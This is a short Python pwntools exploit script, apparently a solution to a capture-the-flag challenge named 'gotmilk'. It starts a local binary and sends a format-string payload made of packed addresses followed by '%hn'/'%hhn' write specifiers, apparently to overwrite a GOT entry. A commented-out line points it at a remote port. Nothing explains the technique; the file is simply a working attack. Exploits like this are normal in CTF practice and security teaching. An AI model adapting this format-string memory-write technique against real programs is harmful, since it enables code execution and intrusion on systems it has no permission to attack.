from pwn import *

p = process("./dist/gotmilk")
# p = remote("127.0.0.1", 8000)
p.sendline('\x10\xc0\x04\x08'+'\x11\xc0\x04\x08'+'\x12\xc0\x04\x08'+'\x13\xc0\x04\x08'+'\x14\xc0\x04\x08'+'\x15\xc0\x04\x08'+'%113c%7$hn' + '%24c%8$hhn')
print p.recv(1024)
